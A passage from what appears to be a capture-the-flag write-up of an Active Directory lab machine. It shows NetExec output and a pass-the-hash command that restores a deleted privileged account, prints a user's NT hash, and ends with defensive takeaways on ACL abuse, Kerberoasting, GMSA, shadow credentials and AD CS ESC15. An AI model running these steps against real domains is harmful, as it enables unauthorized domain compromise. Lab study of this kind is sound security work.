TOMBSTONE   10.129.20.248   389    DC01             dn      CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
TOMBSTONE   10.129.20.248   389    DC01             ID      938182c3-bf0b-410a-9aaa-45c8e1a02ebf
TOMBSTONE   10.129.20.248   389    DC01             isDeleted       TRUE
TOMBSTONE   10.129.20.248   389    DC01             lastKnownParent       OU=ADCS,DC=tombwatcher,DC=htb
TOMBSTONE   10.129.20.248   389    DC01


❯ uv run ./nxc/netexec.py ldap dc01.tombwatcher.htb -u john -H 'ffffffffffffffffffffffffffffffff:<REDACTED>'  -M tombstone -o ACTION=restore ID=938182c3-bf0b-410a-9aaa-45c8e1a02ebf SCHEME=ldap

      Built netexec @ file:///opt/NetExec
Uninstalled 1 package in 0.50ms
Installed 1 package in 0.95ms
LDAP        10.129.20.248   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.129.20.248   389    DC01             [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf
TOMBSTONE   10.129.20.248   389    DC01             Trying to find object with given id 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
TOMBSTONE   10.129.20.248   389    DC01             Found 4 deleted objects, parsing results to recover necessary informations from given ID
TOMBSTONE   10.129.20.248   389    DC01
TOMBSTONE   10.129.20.248   389    DC01             Found target!
TOMBSTONE   10.129.20.248   389    DC01             sAMAccountName      cert_admin
TOMBSTONE   10.129.20.248   389    DC01             dn      CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
TOMBSTONE   10.129.20.248   389    DC01             ID      938182c3-bf0b-410a-9aaa-45c8e1a02ebf
TOMBSTONE   10.129.20.248   389    DC01             isDeleted       TRUE
TOMBSTONE   10.129.20.248   389    DC01             lastKnownParent       OU=ADCS,DC=tombwatcher,DC=htb
TOMBSTONE   10.129.20.248   389    DC01
TOMBSTONE   10.129.20.248   389    DC01             Success "CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb" restored

 /opt/NetExec  main !1 ?1               

```

## Key Takeaways

- **ACL Abuse Chains:** Complex chains of ACL relationships can lead from a low-privileged user to full domain compromise. Each privilege should be carefully reviewed.
    
- **Targeted Kerberoasting:** The ability to set SPNs on other users (`WriteSPN`) can lead to credential theft.
    
- **GMSA Security:** `ReadGMSAPassword` rights should be tightly restricted as they allow extraction of machine account credentials.
    
- **Shadow Credentials:** The ability to add Key Credentials to user objects (`GenericAll`/`GenericWrite`) can lead to authentication compromise.
    
- **Deleted Object Restoration:** Tombstoned objects can be restored by users with appropriate privileges, potentially reviving dormant privileged accounts.
    
- **AD CS Vulnerabilities:** ESC15 (CVE-2024-49019) allows privilege escalation when schema version 1 templates with enrollee-supplied subjects exist.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
